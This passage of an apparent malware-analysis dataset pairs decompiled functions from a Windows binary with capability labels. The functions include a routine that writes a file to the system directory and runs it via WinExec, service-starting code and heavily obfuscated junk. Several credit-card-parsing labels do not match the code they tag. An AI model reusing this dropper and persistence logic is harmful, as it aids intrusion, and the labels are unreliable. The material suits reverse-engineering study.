((!bVar14 && piVar8 != NULL) && (bVar14 || piVar8 == NULL)) {\n        unaff_ESI = unaff_EDI;\n    }\n    if (*piVar8 != 0x4550) {\n        return NULL;\n    }\n    if (piVar8[0x16] != 0) {\n        return NULL;\n    }\n    if (0x80 < arg_8h[0xf]) {\n        uVar11 = arg_8h[0xf] - 0x80;\n        if (0xbf < arg_8h[0xf]) {\n            uVar11 = 0x40;\n        }\n        uVar15 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        piVar10 = uVar15 >> 0x20;\n        piVar8 = uVar15;\n        if (piVar8 == NULL) {\n            return NULL;\n        }\n        if ((piVar8 < 0) || (piVar8 >= 0)) {\n            unaff_ESI = 0;\n        }\n        *(piVar8 + -0x1f3a4905) = extraout_ST0;\n        uVar5 = piVar8 + -1;\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        uVar5 = uVar5 + in_AF * '\\x06';\n        *piVar10 = *piVar10 + -0x9cc207c;\n        pcVar4 = _sym.imp.MSVCRT.dll_rand;\n        piVar10 = piVar8 + -1 & 0xffffff00 | uVar5 + (0x90 < (uVar5 & 0xf0) | in_AF * (0xf9 < uVar5)) * '`';\n        if (uVar11 != 0) {\n            do {\n                iVar9 = (*pcVar4)();\n                uVar13 = unaff_ESI + 1;\n                *(unaff_ESI + piVar8) = iVar9 % 0xff;\n                piVar10 = piVar8;\n                unaff_ESI = uVar13;\n            } while (uVar13 < uVar11);\n        }\n        piVar8 = arg_8h + 0x20;\n        for (uVar13 = uVar11 >> 2; uVar13 != 0; uVar13 = uVar13 - 1) {\n            *piVar8 = *piVar10;\n            piVar10 = piVar10 + 1;\n            piVar8 = piVar8 + 1;\n        }\n        for (uVar11 = uVar11 & 3; uVar11 != 0; uVar11 = uVar11 - 1) {\n            *piVar8 = *piVar10;\n            piVar10 = piVar10 + 1;\n            piVar8 = piVar8 + 1;\n        }\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n        return 0x1;\n    }\n    return NULL;\n}\n",
        "token_count": 1734
    },
    "00402410": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402410(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423668 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403b60(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411464, acStack1304, &uStack2112);\n    uStack2088 = 0x4114ec;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x411504;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404160(auStack1564, 0x411460, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1863
    },
    "00401540": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401710) overlaps instruction at (ram,0x0040170f)\n// \n// WARNING: Removing unreachable block (ram,0x004015c9)\n// WARNING: Removing unreachable block (ram,0x00401670)\n// WARNING: Removing unreachable block (ram,0x0040165b)\n\nvoid __fastcall fcn.00401540(uint32_t param_1, uint32_t **param_2, uint32_t **param_3)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    code *pcVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint32_t **ppuVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    ushort uVar11;\n    uint unaff_EBX;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint32_t **unaff_ESI;\n    uint32_t **ppuVar14;\n    uint32_t **unaff_EDI;\n    uint32_t **ppuVar15;\n    ushort in_SS;\n    uchar in_CF;\n    bool bVar16;\n    uchar in_PF;\n    bool bVar17;\n    uint8_t in_AF;\n    char in_SF;\n    bool bVar18;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char in_OF;\n    bool bVar19;\n    bool bVar20;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint16_t uStackY26;\n    uint32_t **ppuVar21;\n    uint32_t **ppuVar22;\n    \n    puVar12 = &stack0xfffffffc;\n    puVar13 = &stack0xfffffffc;\n    if ((in_PF) || (!in_PF)) {\ncode_r0x0040156a:\n        *param_3 = 0xf5;\n        if ((in_PF) || (!in_PF)) {\n            *(param_3 + 1) = 0x55;\n            ppuVar8 = param_3;\n            goto code_r0x0040158b;\n        }\n        unaff_ESI = 0x34a96cf4;\n        puVar12 = *0xc617b43a;\n        ppuVar8 = param_2 + 2;\n        puVar1 = puVar12 + 0x72;\n        in_CF = CARRY4(*puVar1, param_3);\n        in_OF = SCARRY4(*puVar1, param_3);\n        *puVar1 = *puVar1 + param_3;\n        in_SF = *puVar1 < 0;\n        in_PF = (POPCOUNT(*puVar1 & 0xff) & 1U) == 0;\n    }\n    else {\n        ppuVar8 = segment(in_SS, *0x10 + -0x10);\n        param_2 = 0xb7bc9ea5;\n        ppuVar8 = *ppuVar8;\n        if (!in_CF) {\n            if (in_PF) {\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            in_CF = 0;\n            in_OF = '\\0';\n            in_SF = &stack0xfffffff4 < 0;\n            in_PF = (POPCOUNT(&stack0xfffffff4 & 0xff) & 1U) == 0;\n            goto code_r0x0040156a;\n        }\ncode_r0x0040158b:\n        param_3 = param_2;\n        if (in_CF) goto code_r0x004015a3;\n    }\n    puVar13 = puVar12;\n    if (in_CF) {\n        uVar6 = ppuVar8;\n        cVar4 = uVar6 - *unaff_EDI;\n        func_0x10187515((in_NT & 1) * 0x4000 | SBORROW1(uVar6, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar4 < '\\0') * 0x80 | (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar4) & 1U) == 0) * 4 | uVar6 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                        (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\ncode_r0x004015a3:\n    *(ppuVar8 + 2) = 0xfd;\n    ppuVar15 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, ppuVar8);\n        param_3 = param_3 & 0xffffff00 | param_3 ^ param_1;\n        ppuVar15 = unaff_EDI + 1;\n        *unaff_EDI = ppuVar8;\n        in_PF = (POPCOUNT((unaff_EBX >> 8) - *ppuVar8) & 1U) == 0;\n    }\n    *(ppuVar8 + 3) = 0x9f;\n    if ((in_PF) || (!in_PF)) {\n        *(ppuVar8 + 1) = 0x1a;\n    }\n    else {\n        unaff_ESI = unaff_ESI + 0x10;\n        ppuVar8 = ppuVar8 & 0xffffff00 | ppuVar8 + 0x1a;\n    }\n    uStackY26 = param_1;\n    *(ppuVar8 + 5) = 0xf4;\n    uVar5 = param_1 & 0xffff0000 | uStackY26 & 0xff | ((param_1 << 0x10) >> 0x18) - unaff_EBX << 8;\n    bVar19 = SBORROW4(uVar5, param_3);\n    bVar18 = uVar5 - param_3 < 0;\n    uVar7 = unaff_ESI;\n    iVar10 = *(puVar13 + 8);\n    *(iVar10 + 6) = 0x31;\n    ppuVar22 = ppuVar8;\n    if (uVar5 < param_3) goto code_r0x0040161b;\n    do {\n        uVar7 = unaff_ESI;\n        ppuVar14 = ppuVar8;\n        iVar9 = iVar10;\n        ppuVar21 = ppuVar22 & 0xffff | iVar10 << 0x10;\n        if (bVar19 == bVar18) {\ncode_r0x0040161b:\n            *(iVar10 + 7) = 0xc;\n            ppuVar14 = ppuVar8;\n            iVar9 = iVar10;\n            ppuVar21 = ppuVar8;\n        }\n        iVar10 = iVar9 + 1;\n        uVar7 = (uVar7 | 0x50) + unaff_EBX | 0x11a9;\n        bVar19 = uVar7 < 0;\n        bVar18 = uVar7 == 0;\n        uVar6 = POPCOUNT(uVar7 & 0xff);\n        *(iVar9 + 9) = 0xf7;\n        ppuVar22 = ppuVar21;\n        if ((bVar19) || (ppuVar22 = ppuVar21 & 0xffff,  !bVar19)) {\n            *(iVar9 + 10) = 0x38;\n            ppuVar8 = ppuVar21;\n        }\n        else {\n            iVar10 = iVar9 + 2;\n            *ppuVar14 = *ppuVar14 | ppuVar15;\n            bVar19 = *ppuVar14 < 0;\n            bVar18 = *ppuVar14 == NULL;\n            uVar6 = POPCOUNT(*ppuVar14 & 0xff);\n            ppuVar8 = ppuVar14;\n            ppuVar14 = ppuVar21;\n        }\n        bVar17 = (uVar6 & 1) == 0;\n        if (bVar19 == false) {\n            ppuVar22 = ppuVar15;\n        }\n        uVar11 = SUB42(param_3, 0);\n        bVar20 = false;\n        bVar16 = false;\n        *(iVar10 + 10) = 0x1d;\n        if (bVar17) goto code_r0x0040168e;\n        while (uVar11 = SUB42(param_3, 0),  !bVar17) {\ncode_r0x0040168e:\n            *(iVar10 + 0xb) = 0x62;\n            if ((bVar18 || bVar20 != bVar19) || (!bVar18 && bVar20 == bVar19)) {\n                ppuVar8 = CONCAT31(ppuVar8 >> 8, 0xe3);\n            }\n            *(iVar10 + 0xc) = ppuVar8;\n            if ((!bVar20) && (ppuVar22 = ppuVar22 & 0xffff,  bVar20)) {\n                LOCK();\n                ppuVar14 = 0x138b2633;\n                bVar16 = 0x9a70ae80 < ppuVar8;\n                bVar20 = SCARRY4(ppuVar8, 0x658f517f);\n                ppuVar8 = ppuVar8 + 0x658f517f;\n                bVar19 = ppuVar8 < 0;\n                bVar18 = ppuVar8 == NULL;\n                bVar17 = (POPCOUNT(ppuVar8 & 0xff) & 1U) == 0;\n            }\n            *(iVar10 + 0xd) = ppuVar8;\n            if ((bVar17) || (!bVar17)) goto code_r0x004016ef;\n            puVar2 = segment(in_SS, *0x10 + -0x10);\n            ppuVar8 = *puVar2;\n            param_3 = 0xb7bc9ea5;\n            uVar11 = 0x9ea5;\n            if (bVar16) {\n                puVar12 = ppuVar14 + 1;\n                *(ppuVar14 + 0x51) = *(ppuVar14 + 0x51) + (iVar10 >> 8) + bVar16;\n                goto code_r0x00401714;\n            }\n            uVar11 = 0x9ea5;\n            if (!bVar17) {\ncode_r0x004016ef:\n                *(iVar10 + 0xe) = 6;\n                *(iVar10 + 0xf) = 0x23;\n                puVar12 = *(puVar13 + 8);\n                puVar12[0x10] = 0x6e;\ncode_r0x00401714:\n                puVar12[0x11] = 0x1e;\n                puVar12[0x12] = 8;\n                bVar18 = (iVar10 - 1U & ppuVar15 | 0x61be) != 0;\n                puVar12[0x13] = 0x4c;\n                if ((bVar18) && (!bVar18)) {\n                    out(*puVar12, uVar11);\n                }\n                **(puVar13 + 0xc) = 0x14;\n                return;\n            }\n        }\n        unaff_ESI = *ppuVar15;\n        *ppuVar15 = ppuVar14;\n        puVar13 = puVar13 + -*(puVar13 + 0x5f9dff63);\n        if (-1 < puVar13) {\n            bVar16 = false;\n            bVar20 = false;\n            bVar19 = unaff_ESI < 0;\n            bVar18 = unaff_ESI == NULL;\n            bVar17 = (POPCOUNT(unaff_ESI & 0xff) & 1U) == 0;\n            ppuVar14 = unaff_ESI;\n            if (bVar19) goto code_r0x0040168e;\n            goto code_r0x004016ef;\n        }\n        bVar19 = SCARRY1(*ppuVar8, ppuVar8);\n        *ppuVar8 = *ppuVar8 + ppuVar8;\n        bVar18 = *ppuVar8 < '\\0';\n    } while( true );\n}\n",
        "token_count": 2880
    },
    "00402710": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004028df) overlaps instruction at (ram,0x004028dd)\n// \n// WARNING: Removing unreachable block (ram,0x004027be)\n// WARNING: Removing unreachable block (ram,0x004027cf)\n\nvoid __cdecl fcn.00402710(uchar *arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    char cVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    int16_t iVar8;\n    int32_t in_EAX;\n    uint uVar9;\n    uint8_t uVar11;\n    uint32_t in_EDX;\n    uint32_t uVar10;\n    uint8_t uVar12;\n    int32_t unaff_EBX;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint32_t unaff_ESI;\n    char *unaff_EDI;\n    char *pcVar16;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool bVar17;\n    bool bVar18;\n    float10 in_ST0;\n    uint16_t uStack24183;\n    uint16_t uStack24179;\n    uint16_t uStack20;\n    \n    puVar14 = &stack0xfffffffc;\n    puVar15 = &stack0xfffffffc;\n    bVar17 = (unaff_ESI | 0x561b) < in_EDX;\n    uVar10 = (unaff_ESI | 0x561b) - in_EDX;\n    bVar18 = (POPCOUNT(uVar10 & 0xff) & 1U) == 0;\n    *arg_8h = 0xf9;\n    if ((-1 < uVar10) && (-1 >= uVar10)) {\n        puVar1 = unaff_EDI + 4;\n        *(unaff_EDI + 0x1c) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        bVar17 = *(unaff_ESI + 4) < *puVar1;\n        bVar18 = (POPCOUNT(*(unaff_ESI + 4) - *puVar1) & 1U) == 0;\n    }\n    iVar6 = *0x10;\n    arg_8h[1] = 0x8d;\n    if ((!bVar18) && (bVar18)) {\n        puVar13 = segment(in_SS, iVar6 + -0xc);\n        uVar9 = *puVar13;\n        in_EDX = 0xb7bc9ea5;\n        uStack24179 = 0x9ea5;\n        if (bVar17) {\n            *(unaff_EDI + -0x41) = (*(unaff_EDI + -0x41) + 0x4843615b) - bVar17;\n            iVar8 = CONCAT11(0x13, uVar9) + 0x7d5f;\n            goto code_r0x004027ac;\n        }\n        if (bVar18) {\n            return;\n        }\n        in_EAX = uVar9;\n        unaff_ESI = 0xb7bc9ea5;\n    }\n    uStack24179 = in_EDX;\n    arg_8h[2] = 0xfe;\n    uStack24183 = in_EAX;\n    uVar7 = uStack24183 ^ unaff_EBX;\n    arg_8h[3] = 0x54;\n    puVar15 = &stack0xfffffffc;\n    if ((uVar7 != 0) && (puVar15 = &stack0xfffffffc,  uVar7 == 0)) {\n        puVar13 = &stack0xfffffff0;\n        puVar15 = &stack0xfffffff0;\n        cVar5 = '\\x10';\n        do {\n            puVar14 = puVar14 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar14;\n            cVar5 = cVar5 + -1;\n        } while ('\\0' < cVar5);\n    }\n    arg_8h[4] = 0xc4;\n    if (uVar7 < 0) goto code_r0x004027b9;\n    if (uVar7 >= 0) goto code_r0x004027b9;\n    uVar10 = in_EDX & 0xffffff00;\n    puVar14 = puVar15;\n    do {\n        uStack24179 = uVar10;\n        iVar8 = in_EAX;\n        in_SS = unaff_ESI;\n        puVar15 = puVar14;\ncode_r0x004027ac:\n        unaff_ESI = in_ES;\n        pcVar16 = unaff_EDI | puVar15;\n        unaff_EDI = pcVar16 + 1;\n        *pcVar16 = iVar8;\n        uStack24179 = uStack24179 & 0xff00;\n        uStack24183 = iVar8 + (iVar8 >> 8) * 'y';\ncode_r0x004027b9:\n        arg_8h[5] = 0xcc;\n        arg_8h[6] = 0xa1;\n        uStack20 = arg_8h;\n        uStack20 = uStack20 | 0x31fd;\n        bVar17 = (POPCOUNT(uStack20 & 0xff) & 1U) == 0;\n        iVar2 = puVar15[2];\n        *(iVar2 + 7) = 0x8c;\n        puVar14 = puVar15;\n        if ((uStack20 != 0) && (uStack20 == 0)) {\n            puVar13 = &stack0xfffffff0;\n            puVar14 = &stack0xfffffff0;\n            cVar5 = '\\x10';\n            do {\n                puVar15 = puVar15 + -1;\n                puVar13 = puVar13 + -1;\n                *puVar13 = *puVar15;\n                cVar5 = cVar5 + -1;\n            } while ('\\0' < cVar5);\n        }\n        *(iVar2 + 8) = 0xfb;\n        if ((bVar17) || (!bVar17)) goto code_r0x00402824;\n        piVar4 = segment(in_SS, iVar6 + -0x5e6f);\n        in_EAX = *piVar4;\n        uVar10 = 0xb7bc9ea5;\n        uStack24179 = 0x9ea5;\n    } while (bVar17);\n    uStack24183 = in_EAX;\ncode_r0x00402824:\n    *(iVar2 + 9) = 0xcc;\n    *(iVar2 + 10) = 0xf1;\n    do {\n        uVar10 = uStack24179;\n        *(iVar2 + 0xb) = 0xe7;\n        iVar3 = puVar14[2];\n        *(iVar3 + 0xc) = 0x41;\n        uVar12 = unaff_EBX >> 8 ^ 0x16 | uStack24183 >> 8;\n        uVar11 = uVar10 >> 8;\n        bVar17 = (POPCOUNT(uVar12 - uVar11) & 1U) == 0;\n        *(iVar3 + 0xd) = 0x33;\n        puVar15 = puVar14;\n        if ((bVar17) || (uStack24179 = uStack24183,  !bVar17)) break;\n        segment(in_SS, iVar6 + -0x5e6f);\n        uVar10 = 0xb7bc9ea5;\n        if (uVar12 < uVar11) {\n            *(unaff_EBX + 0x75db87d2) = *(unaff_EBX + 0x75db87d2) + -1;\n            goto code_r0x004028ea;\n        }\n        uStack24183 = unaff_EBX;\n    } while (bVar17);\n    *(iVar3 + 0xe) = 0x4c;\n    bVar17 = uVar10 != 'Q';\n    *(iVar3 + 0xf) = 0x61;\n    if ((bVar17) && (!bVar17)) {\n        puVar13 = &uStack24179;\n        puVar15 = &uStack24179;\n        cVar5 = '\\x10';\n        do {\n            puVar14 = puVar14 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar14;\n            cVar5 = cVar5 + -1;\n        } while ('\\0' < cVar5);\n    }\ncode_r0x004028ea:\n    *(iVar3 + 0x10) = 0x75;\n    *puVar15[3] = 0x11;\n    return;\n}\n",
        "token_count": 1991
    },
    "004019c0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.004019c0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(hSCManager, 0, 1, 0, 3, 0x80, 0);\n        return uVar2;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0x1ff);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar3, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar4 == 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0x420) {\n            iVar4 = (*pcVar1)();\n            if (iVar4 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n    return 1;\n}\n",
        "token_count": 372
    },
    "00402090": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020c1) overlaps instruction at (ram,0x004020c0)\n// \n\nuint __cdecl fcn.00402090(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint32_t uVar1;\n    int32_t unaff_EBX;\n    bool bVar2;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    uVar1 = fcn.00404020(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    bVar2 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n    if (uVar1 == 0) {\n        return 0;\n    }\n    if ((bVar2) || (!bVar2)) {\n        *(uVar1 + 0x58) = arg_ch;\n    }\n    *(unaff_EBX + 0x50890c55) = *(unaff_EBX + 0x50890c55) | 0x58;\n    fcn.00404020(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 288
    },
    "00402b30": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402c20) overlaps instruction at (ram,0x00402c1c)\n// \n\nuint fcn.00402b30(uint param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uchar *param_6)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    uint *puVar3;\n    uint8_t extraout_CH;\n    uint8_t uVar5;\n    int32_t iVar4;\n    uint8_t uVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    bool bVar11;\n    ulong uVar12;\n    uint uVar13;\n    uchar uStack36;\n    uint uStack35;\n    uchar uStack5;\n    \n    puVar7 = &stack0xfffffffc;\n    uVar12 = fcn.00402de0(param_5, param_6, 0x4111d4, 7);\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    uVar13 = uVar12 >> 0x20;\n    puVar3 = uVar12;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    uStack36 = 0;\n    puVar9 = &uStack36 + 1;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    bVar11 = false;\n    uVar8 = 0;\n    do {\n        if ((!bVar11) && (bVar11)) {\n            LOCK();\n            uVar8 = 0x138b2633;\n        }\n        uVar12 = (*pcVar2)();\n        (&uStack36)[uVar8] = uVar12;\n        uVar8 = uVar8 + 1;\n        bVar11 = SBORROW4(uVar8, 0x20);\n    } while (uVar8 < 0x20);\n    uVar6 = uVar12 >> 0x20;\n    uVar5 = extraout_CH | uVar6 | 0x1f;\n    puVar9 = &uStack36;\n    puVar10 = puVar3;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    if ((uVar5 < '\\x01') || ('\\0' < uVar5)) {\n        param_6 = &uStack36;\n        uVar13 = 0x20;\n    }\n    else {\n        puVar7 = &uStack5;\n        pcVar1 = puVar3 + -0x73;\n        *pcVar1 = *pcVar1 + uVar6 + (0x74 < uVar12);\n        param_3 = 0xffffffff;\n        param_2 = uVar12 >> 0x20;\n        param_4 = param_5;\n        if (*pcVar1 != '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    *(param_2 + -0x75) = *(param_2 + -0x75) & param_2;\n    fcn.004039d0(*(puVar7 + 8), param_2, param_3, puVar7, param_4, param_6, uVar13);\n    fcn.00402090(*(puVar7 + 0x18), *(puVar7 + 0x1c));\n    return 1;\n}\n",
        "token_count": 883
    },
    "00402eb0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nbool fcn.00402eb0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4115e0, 0x411608, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 319
    },
    "004036d0": {
        "rules": [
